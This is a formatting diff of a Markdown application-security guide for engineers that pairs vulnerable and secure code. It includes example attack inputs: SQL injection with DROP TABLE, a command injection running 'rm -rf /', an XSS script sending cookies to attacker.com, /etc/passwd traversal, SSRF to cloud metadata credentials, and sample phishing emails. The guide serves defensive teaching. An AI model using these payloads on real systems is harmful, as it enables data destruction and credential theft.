@@ -5,6 +5,7 @@
 This document provides a comprehensive guide to application security fundamentals for infrastructure engineers and developers. It covers the essential security concepts, vulnerabilities, defensive mechanisms, and secure development practices needed to build robust systems.
 
 **Core Topics**:
+
 - Privilege Access Management (PAM)
 - OWASP Top 10 web vulnerabilities
 - Web Application Firewalls (WAF)
@@ -45,17 +46,18 @@ Privilege Access Management (PAM) is a security framework that controls, monitor
 
 ### PAM Concepts
 
-| Concept | Definition | Example |
-|---------|-----------|---------|
-| **Privileged User** | Account with elevated permissions | DBA, DevOps engineer, root user |
-| **Session Timeout** | Auto-logout after inactivity | 1 hour for cloud console |
-| **MFA** | Multi-factor authentication | Google Authenticator + password |
+| Concept                | Definition                           | Example                         |
+| ---------------------- | ------------------------------------ | ------------------------------- |
+| **Privileged User**    | Account with elevated permissions    | DBA, DevOps engineer, root user |
+| **Session Timeout**    | Auto-logout after inactivity         | 1 hour for cloud console        |
+| **MFA**                | Multi-factor authentication          | Google Authenticator + password |
 | **Just-in-Time (JIT)** | Access granted temporarily on-demand | Approve 4-hour DB delete access |
-| **Session Recording** | Audit trail of all actions | Track SSH commands executed |
+| **Session Recording**  | Audit trail of all actions           | Track SSH commands executed     |
 
 ### PAM Best Practices (Framework)
 
 #### 1️⃣ Strong Authentication
+
 ```yaml
 Requirements:
   - Multi-factor authentication (MFA) mandatory for all privileged accounts
@@ -71,6 +73,7 @@ Example Policy:
 ```
 
 #### 2️⃣ Regular Access Review
+
 ```bash
 # Quarterly privilege audit
 kubectl get rolebindings -A                    # Kubernetes RBAC
@@ -82,6 +85,7 @@ kubectl delete rolebinding old-ci-account       # Clean up old CI/CD accounts
 ```
 
 #### 3️⃣ Detailed Monitoring & Auditing
+
 ```yaml
 Events to log (Immutable audit trail):
   - Privilege escalation (sudo, su, sudo -s)
@@ -96,6 +100,7 @@ Storage:
 ```
 
 #### 4️⃣ Strong Password Policy
+
 ```yaml
 Password Requirements (Minimum):
   - Length: 16+ characters (or passphrase)
@@ -110,6 +115,7 @@ Example:
 ```
 
 #### 5️⃣ Session Timeout
+
 ```yaml
 Session Duration:
   - Development: 8 hours
@@ -124,6 +130,7 @@ Example (kubectl):
 ```
 
 #### 6️⃣ Dynamic & Context-Based Access (Just-in-Time)
+
 ```yaml
 Traditional (Risky):
   User role: Database Operator
@@ -145,18 +152,18 @@ Implementation Tools:
 
 ### PAM Compliance Frameworks
 
-| Framework | PAM Requirement | Our Implementation |
-|-----------|-----------------|-------------------|
+| Framework     | PAM Requirement                        | Our Implementation |
+| ------------- | -------------------------------------- | ------------------ |
 | **ISO 27001** | Access control policy, periodic review | ✅ Quarterly audit |
-| **SOC 2** | Role-based access, change log | ✅ Cloud logging |
-| **PCI-DSS** | MFA for admin, 90-day rotation | ✅ Enforced |
-| **GDPR** | Data access logging, JIT | ⚠️ Partial |
+| **SOC 2**     | Role-based access, change log          | ✅ Cloud logging   |
+| **PCI-DSS**   | MFA for admin, 90-day rotation         | ✅ Enforced        |
+| **GDPR**      | Data access logging, JIT               | ⚠️ Partial         |
 
 ---
 
 ## 3. OWASP Top 10: Common Web Vulnerabilities (2021)
 
-![OWASP Top 10 2021](/runbooks/security/assets/owasp-top10.png)
+![OWASP Top 10 2021](./assets/owasp-top10.png)
 
 ### Overview
 
@@ -175,6 +182,7 @@ The OWASP Top 10 are the 10 most critical web application security risks. This s
 #### SQL Injection (SQLi)
 
 **Vulnerable Code**:
+
 ```python
 # Python Flask - VULNERABLE
 @app.route('/user/<user_id>')
@@ -185,6 +193,7 @@ def get_user(user_id):
 ```
 
 **Attack**:
+
 ```
 URL: /user/1 OR 1=1
 → Query becomes: SELECT id, name, email FROM users WHERE id = 1 OR 1=1
@@ -196,6 +205,7 @@ URL: /user/1; DROP TABLE users;--
 ```
 
 **Secure Code** (Parameterized Query):
+
 ```python
 # SECURE - Uses parameterized query
 @app.route('/user/<user_id>')
@@ -206,6 +216,7 @@ def get_user(user_id):
 ```
 
 **How It Works**:
+
 - Database driver sanitizes `user_id` before inserting into query
 - Cannot break out of string or inject SQL operators
 - Trusted: always use parameterized queries
@@ -213,6 +224,7 @@ def get_user(user_id):
 #### Command Injection
 
 **Vulnerable Code**:
+
 ```python
 # VULNERABLE - User input passed to shell
 @app.route('/convert', methods=['POST'])
@@ -223,6 +235,7 @@ def convert_file():
 ```
 
 **Attack**:
+
 ```
 Input: "video.mp4; rm -rf /"
 → Executes: ffmpeg -i video.mp4; rm -rf /
@@ -230,6 +243,7 @@ Input: "video.mp4; rm -rf /"
 ```
 
 **Secure Code** (Use subprocess with list):
+
 ```python
 # SECURE - Arguments passed as list, not string
 import subprocess
@@ -253,6 +267,7 @@ def convert_file():
 #### Stored XSS (Persistent)
 
 **Vulnerable Code**:
+
 ```python
 # VULNERABLE - User comment rendered without escaping
 @app.route('/posts/<post_id>')
@@ -262,19 +277,22 @@ def view_post(post_id):
 ```
 
 **Attack**: Comment contains:
+
 ```html
 <script>
-  fetch('https://attacker.com/steal?cookie=' + document.cookie)
+  fetch("https://attacker.com/steal?cookie=" + document.cookie);
 </script>
 ```
 
 **Result**:
+
 - Comment stored in database
 - Every visitor's page renders JavaScript
 - Attacker receives visitor's session cookie
 - Attacker can impersonate victims
 
 **Secure Code** (HTML Escape):
+
 ```python
 # SECURE - Use framework's escape function
 from flask import escape
@@ -286,6 +304,7 @@ def view_post(post_id):
 ```
 
 **How Escaping Works**:
+
 ```
 Original:  <script>alert('xss')</script>
 Escaped:   &lt;script&gt;alert('xss')&lt;/script&gt;
@@ -295,6 +314,7 @@ Rendered:  <script>alert('xss')</script>  (text, not executable)
 #### Reflected XSS (Non-Persistent)
 
 **Vulnerable Code**:
+
 ```python
 # VULNERABLE - URL parameter rendered directly
 @app.route('/search')
@@ -304,6 +324,7 @@ def search():
 ```
 
 **Attack URL**:
+
 ```
 /search?q=<script>alert('xss')</script>
 → Page renders: <p>Search results for: <script>alert('xss')</script></p>
@@ -311,6 +332,7 @@ def search():
 ```
 
 **Secure Code**:
+
 ```python
 # SECURE - Escape user input
 @app.route('/search')
@@ -332,6 +354,7 @@ def search():
 #### Local File Inclusion (LFI)
 
 **Vulnerable Code**:
+
 ```python
 # VULNERABLE - User controls file path
 @app.route('/download')
@@ -342,6 +365,7 @@ def download_file():
 ```
 
 **Attack**:
+
 ```
 URL: /download?path=../../../etc/passwd
 → filepath = /downloads/../../../etc/passwd = /etc/passwd
@@ -349,6 +373,7 @@ URL: /download?path=../../../etc/passwd
 ```
 
 **Secure Code** (Use safe path utilities):
+
 ```python
 # SECURE - Use send_from_directory which validates paths
 @app.route('/download')
@@ -361,6 +386,7 @@ def download_file():
 #### Remote SSRF
 
 **Vulnerable Code**:
+
 ```python
 # VULNERABLE - User controls remote URL
 @app.route('/proxy')
@@ -371,6 +397,7 @@ def proxy_request():
 ```
 
 **Attack**:
+
 ```
 URL: /proxy?url=http://internal-payment-api:8080/admin/refund
 → Server connects to internal API (not accessible from internet)
@@ -383,6 +410,7 @@ URL: /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials
 ```
 
 **Secure Code** (Whitelist URLs):
+
 ```python
 # SECURE - Use hardcoded config, don't accept user input
 ALLOWED_PAYMENT_PROVIDER = "https://secure-payment.trusted-provider.com"
@@ -403,6 +431,7 @@ def process_payment():
 **Definition**: Weak credential management, session handling, or access control allows attackers to impersonate users.
 
 **Examples**:
+
 - Plaintext passwords in logs/code
 - Guessable session tokens
 - No MFA
@@ -412,6 +441,7 @@ def process_payment():
 #### Vulnerable Session Management
 
 **Vulnerable Code**:
+
 ```python
 # VULNERABLE - Predictable session token
 import time
@@ -426,6 +456,7 @@ def create_session():
 **Attack**: Attacker can guess next token based on current one
 
 **Secure Code** (Use cryptographic random):
+
 ```python
 # SECURE - Cryptographically random token
 import secrets
@@ -445,6 +476,7 @@ def create_session(user_id):
 **Definition**: Users can access resources they shouldn't (horizontal/vertical privilege escalation).
 
 **Examples**:
+
 - User A views User B's profile by changing URL
 - Regular user accesses admin panel
 - User modifies own permissions
@@ -452,6 +484,7 @@ def create_session(user_id):
 #### Horizontal Privilege Escalation
 
 **Vulnerable Code**:
+
 ```python
 # VULNERABLE - No check if user owns the resource
 @app.route('/profile/<user_id>')
@@ -461,6 +494,7 @@ def view_profile(user_id):
 ```
 
 **Attack**:
+
 ```
 Current user: 123
 URL: /profile/456
@@ -469,6 +503,7 @@ URL: /profile/456
 ```
 
 **Secure Code** (Ownership check):
+
 ```python
 # SECURE - Verify ownership before returning
 from flask import session
@@ -476,10 +511,10 @@ from flask import session
 @app.route('/profile/<user_id>')
 def view_profile(user_id):
     current_user = get_current_user()  # From session
-    
+
     if int(user_id) != current_user.id:
         return {'error': 'Unauthorized'}, 403  # Not allowed
-    
+
     user = db.query(User).filter(User.id == user_id).first()
     return {'name': user.name, 'email': user.email}  # No SSN
 ```
@@ -487,6 +522,7 @@ def view_profile(user_id):
 #### Vertical Privilege Escalation
 
 **Vulnerable Code**:
+
 ```python
 # VULNERABLE - User can modify own role
 @app.route('/profile', methods=['POST'])
@@ -498,6 +534,7 @@ def update_profile():
 ```
 
 **Attack**:
+
 ```
 POST /profile
 role=admin
@@ -507,17 +544,18 @@ role=admin
 ```
 
 **Secure Code** (Only allow safe fields):
+
 ```python
 # SECURE - Only admin can change role, user can't
 @app.route('/profile', methods=['POST'])
 def update_profile():
     user = get_current_user()
-    
+
     # Only update safe fields
     user.name = request.form.get('name')
     user.email = request.form.get('email')
     # role is NOT updated (admin-only operation)
-    
+
     db.commit()
     return {'success': True}
 
@@ -527,7 +565,7 @@ def update_profile():
 def update_user_role(user_id):
     if not is_admin(get_current_user()):
         return {'error': 'Forbidden'}, 403
-    
+
     user = db.query(User).filter(User.id == user_id).first()
     user.role = request.form.get('role')
     db.commit()
@@ -543,6 +581,7 @@ def update_user_role(user_id):
 **Definition**: Sensitive data (PII, credentials, payment info) exposed in transit or at rest.
 
 **Examples**:
+
 - HTTP instead of HTTPS
 - Unencrypted database fields
 - Credentials in code/logs
@@ -561,6 +600,7 @@ db.commit()
 ```
 
 **Secure Code** (Password Hashing):
+
 ```python
 # SECURE - Use bcrypt (adaptive hash, gets slower over time)
 from bcrypt import hashpw, checkpw, gensalt
@@ -593,7 +633,7 @@ else:
 
 ## 4. Web Application Firewall (WAF) Architecture
 
-![WAF Architecture](/runbooks/security/assets/waf-architecture.png)
+![WAF Architecture](./assets/waf-architecture.png)
 
 ### What is WAF?
 
@@ -603,11 +643,11 @@ else:
 
 ### WAF Detection Methods
 
-| Detection Type | Examples | Bypass Risk |
-|---|---|---|
-| **Rule-Based** | SQL keywords (OR, UNION), known SQLi patterns | Low (signature-based) |
-| **Heuristic** | Unusual encoding, character count, entropy | Medium (behavioral) |
-| **ML-Based** | Anomaly detection, traffic profiling | High (can be evaded with obfuscation) |
+| Detection Type | Examples                                      | Bypass Risk                           |
+| -------------- | --------------------------------------------- | ------------------------------------- |
+| **Rule-Based** | SQL keywords (OR, UNION), known SQLi patterns | Low (signature-based)                 |
+| **Heuristic**  | Unusual encoding, character count, entropy    | Medium (behavioral)                   |
+| **ML-Based**   | Anomaly detection, traffic profiling          | High (can be evaded with obfuscation) |
 
 ### WAF Request Flow
 
@@ -697,33 +737,34 @@ WAF Rules Configuration:
   - Detection Mode: First 1 week (logs only, no blocking)
     Monitors: What rules would trigger
     Review: False positives (legitimate requests blocked)
-  
+
   - Enforcement Mode: After false positive review
     Protection Level: Medium (balance security + usability)
     Exceptions: Whitelist trusted partners if needed
-  
+
   - Sensitive Operations:
-    - Admin panel: Stricter rules
-    - Payment: Strict rate limiting
-    - Login: Challenge on multiple failed attempts
-  
+      - Admin panel: Stricter rules
+      - Payment: Strict rate limiting
+      - Login: Challenge on multiple failed attempts
+
   - Monitoring:
-    - Track block rate (should be < 1% for legitimate traffic)
-    - Alert if block rate spikes (possible attack or misconfiguration)
-    - Review blocked requests weekly
+      - Track block rate (should be < 1% for legitimate traffic)
+      - Alert if block rate spikes (possible attack or misconfiguration)
+      - Review blocked requests weekly
 ```
 
 ---
 
 ## 5. Secure SDLC: SAST & DAST
 
-![Secure SDLC Flow](/runbooks/security/assets/secure-sdlc.png)
+![Secure SDLC Flow](./assets/secure-sdlc.png)
 
 ### What is Secure SDLC?
 
 **Definition**: Integrating security testing throughout the software development lifecycle instead of checking at the end.
 
 **Benefits**:
+
 - Catch vulnerabilities early (cost ↓ 10-100x)
 - Prevent deployment of vulnerable code
 - Educate developers on secure coding
@@ -735,30 +776,33 @@ WAF Rules Configuration:
 **Definition**: Analyze source code without running it to find vulnerabilities.
 
 **How It Works**:
+
 ```
 Source Code → SAST Scanner → Parse AST → Apply Rules → Report Issues
 ```
 
 **Advantages**:
+
 - ✅ Early detection (before compilation)
 - ✅ No test environment needed
 - ✅ Fast feedback to developer
 - ✅ Good for injection vulnerabilities
 
 **Limitations**:
+
 - ❌ High false positives
 - ❌ Cannot detect runtime vulnerabilities
 - ❌ Struggles with dynamic code
 
 #### SAST Tools
 
-| Tool | Language | Type | Free? |
-|------|----------|------|-------|
-| **Semgrep** | Python, JS, Java, Go | Pattern-based | ✅ |
-| **SonarQube** | Java, C#, Python, JS | Heuristic | ✅ Free tier |
-| **Snyk** | Python, JS, Java, Go | Dependency + code | ❌ |
-| **Pylint** | Python | Style + basic checks | ✅ |
-| **ESLint** | JavaScript | Style + security | ✅ |
+| Tool          | Language             | Type                 | Free?        |
+| ------------- | -------------------- | -------------------- | ------------ |
+| **Semgrep**   | Python, JS, Java, Go | Pattern-based        | ✅           |
+| **SonarQube** | Java, C#, Python, JS | Heuristic            | ✅ Free tier |
+| **Snyk**      | Python, JS, Java, Go | Dependency + code    | ❌           |
+| **Pylint**    | Python               | Style + basic checks | ✅           |
+| **ESLint**    | JavaScript           | Style + security     | ✅           |
 
 #### SAST Example: Semgrep
 
@@ -782,13 +826,13 @@ Enterprise SAST Pipeline:
   Tool: company/analyzer
   Integration: .gitlab-ci.yml
   Trigger: On every merge request
-  
+
   Config:
     include:
-      - project: 'company/analyzer'
+      - project: "company/analyzer"
         ref: v1
-        file: 'shared/pipeline-template/.gitlab-sast-general.yaml'
-  
+        file: "shared/pipeline-template/.gitlab-sast-general.yaml"
+
   On Vulnerability Found:
     - Status: ❌ Pipeline FAILS
     - Developer: Fix or whitelist false positive
@@ -805,18 +849,21 @@ Enterprise SAST Pipeline:
 **Definition**: Test running application (black box) by sending malicious requests and observing behavior.
 
 **How It Works**:
+
 ```
-Running App → Reconnaissance (discover APIs) → Fuzzing (send payloads) 
+Running App → Reconnaissance (discover APIs) → Fuzzing (send payloads)
 → Analyze Response (500 = SQL error?) → Report Issues
 ```
 
 **Advantages**:
+
 - ✅ Tests actual running behavior
 - ✅ Finds runtime vulnerabilities (race conditions, etc.)
 - ✅ Detects vulnerabilities in dependencies
 - ✅ Comprehensive (covers entire app)
 
 **Limitations**:
+
 - ❌ Slow (test all combinations)
 - ❌ Late detection (only in test env)
 - ❌ May crash or corrupt test data
@@ -824,12 +871,12 @@ Running App → Reconnaissance (discover APIs) → Fuzzing (send payloads)
 
 #### DAST Tools
 
-| Tool | Type | Free? |
-|------|------|-------|
-| **OWASP ZAP** | API fuzzing + proxy | ✅ |
-| **Burp Suite** | Web proxy + scanner | ❌ (Pro version) |
-| **Acunetix** | Web vulnerability scanner | ❌ |
-| **StackHawk** | DAST in CI/CD | ❌ |
+| Tool           | Type                      | Free?            |
+| -------------- | ------------------------- | ---------------- |
+| **OWASP ZAP**  | API fuzzing + proxy       | ✅               |
+| **Burp Suite** | Web proxy + scanner       | ❌ (Pro version) |
+| **Acunetix**   | Web vulnerability scanner | ❌               |
+| **StackHawk**  | DAST in CI/CD             | ❌               |
 
 #### DAST Example: OWASP ZAP
 
@@ -849,31 +896,31 @@ zaproxy -cmd -quickurl http://localhost:8080 -quickout report.html
 
 ### SAST vs DAST Comparison
 
-| Aspect | SAST | DAST |
-|--------|------|------|
-| **When** | Development (before build) | Pre-release (test env) |
-| **Speed** | Fast (seconds) | Slow (minutes/hours) |
-| **Setup** | Easy (requires source) | Complex (needs running app) |
-| **Coverage** | High (all code) | Partial (only reachable paths) |
-| **False Positives** | High (30-50%) | Low (5-10%) |
-| **Injection Detection** | ✅ Excellent | ✅ Good |
-| **Race Conditions** | ❌ Can't detect | ✅ Can detect |
-| **Real Behavior** | ❌ Misses runtime logic | ✅ Actual execution |
+| Aspect                  | SAST                       | DAST                           |
+| ----------------------- | -------------------------- | ------------------------------ |
+| **When**                | Development (before build) | Pre-release (test env)         |
+| **Speed**               | Fast (seconds)             | Slow (minutes/hours)           |
+| **Setup**               | Easy (requires source)     | Complex (needs running app)    |
+| **Coverage**            | High (all code)            | Partial (only reachable paths) |
+| **False Positives**     | High (30-50%)              | Low (5-10%)                    |
+| **Injection Detection** | ✅ Excellent               | ✅ Good                        |
+| **Race Conditions**     | ❌ Can't detect            | ✅ Can detect                  |
+| **Real Behavior**       | ❌ Misses runtime logic    | ✅ Actual execution            |
 
 ---
 
 ## 6. Secure Authentication & Authorization
 
-![Authentication Flow](/runbooks/security/assets/auth-flow.png)
+![Authentication Flow](./assets/auth-flow.png)
 
 ### Authentication vs Authorization
 
-| Aspect | Authentication | Authorization |
-|--------|---|---|
-| **Definition** | "Are you who you claim?" | "Are you allowed to do this?" |
-| **Example** | Login with password | Access /admin endpoint |
-| **Failure** | Wrong password (401 Unauthorized) | Wrong permissions (403 Forbidden) |
-| **Question** | "Is this Alice?" | "Can Alice view this document?" |
+| Aspect         | Authentication                    | Authorization                     |
+| -------------- | --------------------------------- | --------------------------------- |
+| **Definition** | "Are you who you claim?"          | "Are you allowed to do this?"     |
+| **Example**    | Login with password               | Access /admin endpoint            |
+| **Failure**    | Wrong password (401 Unauthorized) | Wrong permissions (403 Forbidden) |
+| **Question**   | "Is this Alice?"                  | "Can Alice view this document?"   |
 
 ### Authentication Methods
 
@@ -901,11 +948,13 @@ Client                              Server
 ```
 
 **Vulnerabilities**:
+
 - ❌ User reuses passwords across sites
 - ❌ Passwords weak/guessable
 - ❌ No MFA
 
 **Mitigation**:
+
 - ✅ Enforce strong passwords (16+ characters)
 - ✅ Rate-limit login attempts (5 attempts → 15 min lockout)
 - ✅ Require MFA (Google Authenticator, Yubikey)
@@ -948,6 +997,7 @@ User wants to login to YourApp using Google account:
 ```
 
 **Advantages**:
+
 - ✅ User never shares password with YourApp
 - ✅ Google handles password security
 - ✅ Easy multi-factor for user (Google manages it)
@@ -980,11 +1030,12 @@ HMAC(header + payload + secret_key)
 ```
 
 **Flow**:
+
 ```
 1. Client logs in:
    POST /login
    {username, password}
-   
+
 2. Server verifies and creates JWT:
    JWT = sign({user_id, exp, role}, server_secret)
    Return: {token: JWT}
@@ -1002,11 +1053,13 @@ HMAC(header + payload + secret_key)
 ```
 
 **Advantages**:
+
 - ✅ Stateless (no server session storage needed)
 - ✅ Scalable (can validate on any server)
 - ✅ Portable (can use across microservices)
 
 **Disadvantages**:
+
 - ❌ Cannot revoke immediately (token valid until exp)
 - ❌ Larger than session ID (sent with every request)
 - ❌ Must keep secret_key secure
@@ -1026,6 +1079,7 @@ HMAC(header + payload + secret_key)
 #### 1️⃣ Email Spoofing
 
 **Attack**:
+
 ```
 From: noreply@github.com  (actually: attacker@phishing.com)
 To: engineer@company.com
@@ -1037,6 +1091,7 @@ Click here to confirm: https://github-verify.com/login
 ```
 
 **Red Flags**:
+
 - ❌ Urgency ("action required now")
 - ❌ Requests to verify credentials
 - ❌ Sender email slightly different (github.co vs github.com)
@@ -1064,34 +1119,34 @@ Example: Compromise developer.atlassian.com → Target engineers
 
 #### 🚩 Red Flags
 
-| Warning Sign | Example |
-|---|---|
-| **Urgency** | "Verify immediately or account locked" |
-| **Suspicious Sender** | noreply@gmail.com (not company domain) |
-| **Generic Greeting** | "Dear User" instead of "Hi Alice" |
-| **Request for Credentials** | "Confirm your password" |
-| **Suspicious Links** | hover shows different URL |
-| **Attachment Requests** | "Open attached document" (malware) |
-| **Unusual Requests** | "Wire $50K to vendor" |
-| **Poor Grammar** | Spelling errors, weird phrasing |
+| Warning Sign                | Example                                |
+| --------------------------- | -------------------------------------- |
+| **Urgency**                 | "Verify immediately or account locked" |
+| **Suspicious Sender**       | <noreply@gmail.com> (not company domain) |
+| **Generic Greeting**        | "Dear User" instead of "Hi Alice"      |
+| **Request for Credentials** | "Confirm your password"                |
+| **Suspicious Links**        | hover shows different URL              |
+| **Attachment Requests**     | "Open attached document" (malware)     |
+| **Unusual Requests**        | "Wire $50K to vendor"                  |
+| **Poor Grammar**            | Spelling errors, weird phrasing        |
 
 #### ✅ Verification Steps
 
 ```
 1. Email claims to be from GitHub
-   
+
    Step 1: Check sender email
    → Click sender name → See full email address
    → Is it @github.com? Or @phishing.com?
-   
+
    Step 2: Check link destination
    → Hover over link (don't click!)
    → Does URL match sender? (link from GitHub → github.com)
-   
+
    Step 3: Never use link provided
    → Go directly to site (type in address bar)
    → Or find official link elsewhere
-   
+
    Step 4: Call if unsure
    → Phone number from official website (not email)
    → Ask: "Is this request legitimate?"
@@ -1116,12 +1171,14 @@ Apple Support Team
 ```
 
 **Is This Phishing?**
+
 - 🚩 Urgency ("immediate attention")
 - 🚩 Request to verify credentials
 - 🚩 Vague subject (no specific action)
 - ✅ But: Could be legitimate Apple security alert
 
 **How to Verify**:
+
 1. Hover over "CLICK HERE" → See actual URL
 2. If URL is not apple.com → ❌ Phishing
 3. If URL is apple.com → ✅ Likely legitimate
@@ -1144,6 +1201,7 @@ Please login to continue.
 ```
 
 **Red Flags**:
+
 - ❌ Sender: github-updates.co (not github.com)
 - ❌ Link: github-pr-review.io (not github.com)
 - ❌ Request to login (suspicious pattern)
